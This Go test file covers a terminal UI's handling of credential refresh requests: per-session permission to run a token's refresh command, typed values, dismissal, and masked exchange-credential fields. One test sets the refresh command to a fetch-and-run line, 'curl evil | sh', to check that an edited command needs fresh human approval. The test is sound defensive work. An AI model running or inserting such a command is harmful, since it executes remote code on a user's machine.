package tui

import (
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/discobox-ai/discobox/pkg/secretroute"
)

// A refresh request asks for a new value of a token the project holds
// (ADR 26-09-25-122): the window offers to run the command the token suggests,
// here, and remembers "for this session" only for that token and that command.

var ghCommand = []string{"gh", "auth", "token"}

func refreshRequest() CredentialRequest {
	return CredentialRequest{
		ID:        "sreq_refresh",
		SandboxID: "sbx_one",
		Name:      "github",
		Created:   time.Date(2026, 8, 7, 11, 58, 0, 0, time.UTC),
		Refresh:   &RefreshAsk{SecretID: "sec_gh", Cause: "stale"},
	}
}

func sourceWithRefresh(t *testing.T) (*Model, *fakeSource) {
	t.Helper()
	ds := newFakeSource(testSandboxes()...)
	ds.requests = []CredentialRequest{refreshRequest()}
	ds.projectSecrets = []Secret{{
		ID: "sec_gh", Name: "github", Type: "token", Routes: []secretroute.Route{{Hosts: []string{"github.com"}}},
		RefreshCommand: ghCommand, ValueTTL: 5 * time.Minute,
	}}
	return newTestModel(t, ds), ds
}

func openRefresh(t *testing.T, m *Model) {
	t.Helper()
	send(t, m, keyPress("tab"), keyPress(credentialsKey))
	if m.dialog == nil || m.dialog.title != "Refresh request" {
		t.Fatalf("dialog = %s, want the refresh request", describe(m.dialog))
	}
}

func TestARefreshRequestShowsTheCommandBeforeItRuns(t *testing.T) {
	t.Parallel()
	m, _ := sourceWithRefresh(t)
	openRefresh(t, m)

	body := dialogText(m)
	for _, want := range []string{"github", "gh auth token", "past the lifetime"} {
		if !strings.Contains(body, want) {
			t.Fatalf("dialog = %q, want it to carry %q", body, want)
		}
	}
	var keys []string
	for _, item := range m.dialog.items {
		keys = append(keys, item.key)
	}
	if !slices.Equal(keys, []string{"once", "session", "enter", "dismiss"}) {
		t.Fatalf("answers = %v", keys)
	}
}

func TestRunOnceRenewsWithTheCommandAndRemembersNothing(t *testing.T) {
	t.Parallel()
	m, ds := sourceWithRefresh(t)
	openRefresh(t, m)
	drain(t, m, m.dialog.action("once"), 0)

	if len(ds.renewals) != 1 {
		t.Fatalf("renewals = %#v, want one", ds.renewals)
	}
	r := ds.renewals[0]
	if r.RequestID != "sreq_refresh" || r.SecretID != "sec_gh" || !slices.Equal(r.Command, ghCommand) || r.Session {
		t.Fatalf("renewal = %#v", r)
	}
	if m.dialog != nil {
		t.Fatalf("dialog = %s, want it closed", describe(m.dialog))
	}

	// The next ask for the same token is a person's to answer again.
	next := refreshRequest()
	next.ID = "sreq_refresh_2"
	send(t, m, credentialsLoadedMsg{requests: []CredentialRequest{next}})
	if len(ds.renewals) != 1 {
		t.Fatalf("renewals = %#v, want the second ask left waiting", ds.renewals)
	}
}

func TestRunForTheSessionAnswersTheNextAskUnprompted(t *testing.T) {
	t.Parallel()
	m, ds := sourceWithRefresh(t)
	openRefresh(t, m)
	drain(t, m, m.dialog.action("session"), 0)

	next := refreshRequest()
	next.ID = "sreq_refresh_2"
	send(t, m, credentialsLoadedMsg{requests: []CredentialRequest{next}})
	if len(ds.renewals) != 2 {
		t.Fatalf("renewals = %#v, want the second ask answered by the session", ds.renewals)
	}
	if r := ds.renewals[1]; r.RequestID != "sreq_refresh_2" || !r.Session || !slices.Equal(r.Command, ghCommand) {
		t.Fatalf("renewal = %#v, want the session's answer", r)
	}
	if m.dialog != nil {
		t.Fatalf("dialog = %s, want nothing prompted", describe(m.dialog))
	}
}

// The permission is for a command: a token whose command was edited since asks
// a person again.
func TestAnEditedCommandIsNotCoveredByTheSession(t *testing.T) {
	t.Parallel()
	m, ds := sourceWithRefresh(t)
	openRefresh(t, m)
	drain(t, m, m.dialog.action("session"), 0)

	ds.mu.Lock()
	ds.projectSecrets[0].RefreshCommand = []string{"sh", "-c", "curl evil | sh"}
	ds.mu.Unlock()
	next := refreshRequest()
	next.ID = "sreq_refresh_2"
	send(t, m, credentialsLoadedMsg{requests: []CredentialRequest{next}})
	if len(ds.renewals) != 1 {
		t.Fatalf("renewals = %#v, want the edited command left to a person", ds.renewals)
	}
}

func TestARenewalCanBeTypedIn(t *testing.T) {
	t.Parallel()
	m, ds := sourceWithRefresh(t)
	openRefresh(t, m)
	drain(t, m, m.dialog.action("enter"), 0)
	if m.dialog == nil || m.dialog.title != "New value" {
		t.Fatalf("dialog = %s, want the value asked for", describe(m.dialog))
	}
	m.dialog.input.SetValue("gho_pasted")
	send(t, m, keyPress("enter"))
	if len(ds.renewals) != 1 || ds.renewals[0].Value != "gho_pasted" || ds.renewals[0].Command != nil {
		t.Fatalf("renewals = %#v, want the typed value", ds.renewals)
	}
}

// A refresh request is dismissed, not denied: it is its own kind of request,
// and nothing is waiting on a yes or no (ADR 26-10-27-880 §1).
func TestDismissingARefreshDismissesIt(t *testing.T) {
	t.Parallel()
	m, ds := sourceWithRefresh(t)
	openRefresh(t, m)
	drain(t, m, m.dialog.action("dismiss"), 0)
	if !slices.Equal(ds.dismissed, []string{"sreq_refresh"}) || len(ds.denials) != 0 || len(ds.renewals) != 0 {
		t.Fatalf("dismissed = %v, denials = %v, renewals = %v", ds.dismissed, ds.denials, ds.renewals)
	}
}

// A token with no command is offered only a typed value.
func TestATokenWithNoCommandOffersOnlyAValue(t *testing.T) {
	t.Parallel()
	m, ds := sourceWithRefresh(t)
	ds.mu.Lock()
	ds.projectSecrets[0].RefreshCommand = nil
	ds.mu.Unlock()
	openRefresh(t, m)
	for _, item := range m.dialog.items {
		if item.key == "once" || item.key == "session" {
			t.Fatalf("offered %q with no command to run", item.key)
		}
	}
}

// F4 stores a token got from a command: the command is split as typed and
// sent with no value, which the data source runs it for.
func TestTheNewSecretFormTakesACommand(t *testing.T) {
	t.Parallel()
	m, ds := secretsFixture(t)

	send(t, m, keyPress("n"))
	send(t, m, typeString("github")...)
	send(t, m, keyPress("down"), keyPress("down")) // past the kind, onto the binding
	send(t, m, typeString("github.com")...)
	send(t, m, keyPress("down"), keyPress("down")) // the lifetime, then how the value is given
	send(t, m, keyPress("right"))                  // get it from a command
	send(t, m, keyPress("down"))
	send(t, m, typeString(`op read "op://Private/GitHub token/credential"`)...)
	send(t, m, keyPress("enter"))

	if m.dialog != nil {
		t.Fatalf("dialog = %s, want the form answered", describe(m.dialog))
	}
	if len(ds.createdSecrets) != 1 {
		t.Fatalf("created = %#v, want one", ds.createdSecrets)
	}
	got := ds.createdSecrets[0]
	want := []string{"op", "read", "op://Private/GitHub token/credential"}
	if !slices.Equal(got.RefreshCommand, want) || got.Value.Token != "" {
		t.Fatalf("stored = %#v, want the command and no typed value", got)
	}
	// Nobody chose how long a value lasts, and the card said: five minutes.
	if got.ValueTTLSeconds == nil || *got.ValueTTLSeconds != 300 {
		t.Fatalf("value lifetime = %v, want the 5m the card opened on", got.ValueTTLSeconds)
	}
}

// How long a value lasts is on the card for a token got from a command, and
// on the card that edits a token.
func TestAValueLifetimeCanBeChosenAndChanged(t *testing.T) {
	t.Parallel()
	m, ds := secretsFixture(t)

	send(t, m, keyPress("n"))
	send(t, m, typeString("gcloud")...)
	send(t, m, keyPress("down"), keyPress("down")) // past the kind, onto where it may be sent
	send(t, m, typeString("oauth2.googleapis.com")...)
	send(t, m, keyPress("down"), keyPress("down"))  // the binding limit, how the value is given
	send(t, m, keyPress("right"), keyPress("down")) // from a command, onto it
	send(t, m, typeString("gcloud auth print-access-token")...)
	send(t, m, keyPress("down"), keyPress("right"), keyPress("right")) // a value lasts: 5m → 15m → 1h
	send(t, m, keyPress("ctrl+s"))

	if len(ds.createdSecrets) != 1 {
		t.Fatalf("created = %#v, dialog = %s", ds.createdSecrets, describe(m.dialog))
	}
	if got := ds.createdSecrets[0].ValueTTLSeconds; got == nil || *got != 3600 {
		t.Fatalf("value lifetime = %v, want the hour chosen", got)
	}

	secret := Secret{ID: "sec_gc", Name: "gcloud", Type: "token", RefreshCommand: []string{"gcloud", "auth", "print-access-token"}, ValueTTL: time.Hour}
	drain(t, m, m.editSecretForm("", secret), 0)
	if m.dialog.form.chosen("lasts") != "3600" {
		t.Fatalf("edit card opens on %q, want the hour it has", m.dialog.form.chosen("lasts"))
	}
	m.dialog.form.choose("lasts", "0")
	send(t, m, keyPress("enter"))
	if len(ds.updated) == 0 {
		t.Fatalf("no update saved; dialog = %s", describe(m.dialog))
	}
	if got := ds.updated[len(ds.updated)-1].ValueTTLSeconds; got == nil || *got != 0 {
		t.Fatalf("update = %#v, want the lifetime set to never", ds.updated[len(ds.updated)-1])
	}
}

// An exchange credential is never a kind the new card offers — its recipe is
// given with `secret create --exchange-recipe` — but one that exists opens on
// its fields, masked, and its key is replaced whole (ADR 26-10-08-452).
func TestAnExchangeCredentialOpensOnItsFields(t *testing.T) {
	t.Parallel()
	m, ds := secretsFixture(t)

	send(t, m, keyPress("n"), keyPress("down"))
	for _, c := range m.dialog.form.rows[1].choices {
		if c.key == "exchange" {
			t.Fatal("the new card offers an exchange credential, whose recipe it cannot take")
		}
	}
	send(t, m, keyPress("esc"))

	secret := Secret{ID: "sec_bx", Name: "boxd", Type: "exchange", Routes: []secretroute.Route{{Hosts: []string{"boxd.sh"}}},
		Exchange: &SecretExchange{URL: "https://app.boxd.sh/api/v1/auth/token", Fields: []string{"api_key", "org"}}}
	drain(t, m, m.editSecretForm("", secret), 0)
	f := m.dialog.form
	if f.chosen("kind") != "exchange" {
		t.Fatalf("kind = %q, want exchange", f.chosen("kind"))
	}
	typeInto(t, m, exchangeFieldPrefix+"api_key", "bxd_secret")
	if strings.Contains(m.View().Content, "bxd_secret") {
		t.Fatal("the key is drawn in the clear")
	}
	send(t, m, keyPress("enter"))
	if len(ds.updated) != 0 {
		t.Fatalf("half a replacement was saved: %#v", ds.updated)
	}
	typeInto(t, m, exchangeFieldPrefix+"org", "acme")
	send(t, m, keyPress("enter"))
	if len(ds.updated) != 1 || ds.updated[0].Value == nil ||
		ds.updated[0].Value.Exchange["api_key"] != "bxd_secret" || ds.updated[0].Value.Exchange["org"] != "acme" {
		t.Fatalf("update = %#v, want both fields replaced", ds.updated)
	}
}

// A secret got from a command says so where it is chosen, and the request
// card offers no row of its own for running the command: a new credential's
// form is where it is chosen.
func TestASecretFromACommandIsNamedByItAndNotOfferedTwice(t *testing.T) {
	t.Parallel()
	m, ds := sourceWithRequest(t)
	ds.mu.Lock()
	ds.projectSecrets = append(ds.projectSecrets, Secret{
		ID: "sec_ghcmd", Name: "github", Type: "token", Routes: []secretroute.Route{{Hosts: []string{"github.com"}}}, RefreshCommand: ghCommand,
	})
	ds.mu.Unlock()
	send(t, m, credentialsLoadedMsg{requests: ds.requests})
	send(t, m, keyPress("tab"), keyPress(credentialsKey))

	for _, item := range m.dialog.items {
		if item.key == "command" {
			t.Fatal("offered to run the command beside the secret that has it")
		}
		if item.key == "secret:sec_ghcmd" {
			if !strings.Contains(item.detail, "from gh auth token") || strings.Contains(item.detail, "· token ·") || item.emphasis != "gh auth token" {
				t.Fatalf("row = %#v, want it named by its command", item)
			}
		}
	}
}

// Losing the race to answer is not a failure: the token was renewed by
// somebody else, the session keeps its permission, and nothing reads as an
// error.
func TestARenewalThatLostTheRaceIsNotAFailure(t *testing.T) {
	t.Parallel()
	m, ds := sourceWithRefresh(t)
	openRefresh(t, m)
	ds.mu.Lock()
	ds.renewErr = ErrAlreadyAnswered
	ds.mu.Unlock()
	drain(t, m, m.dialog.action("session"), 0)

	if m.dialog != nil {
		t.Fatalf("dialog = %s, want no error for an ask somebody else answered", describe(m.dialog))
	}
	if len(m.renewSession) != 1 {
		t.Fatalf("session permissions = %v, want the one given kept", m.renewSession)
	}
}

// A request a renewal is already out for is not run a second time by hand.
func TestARequestBeingRenewedIsNotRunAgain(t *testing.T) {
	t.Parallel()
	m, ds := sourceWithRefresh(t)
	openRefresh(t, m)
	m.renewing = map[string]bool{"sreq_refresh": true}
	drain(t, m, m.dialog.action("once"), 0)
	if len(ds.renewals) != 0 {
		t.Fatalf("renewals = %#v, want none while one is out", ds.renewals)
	}
}
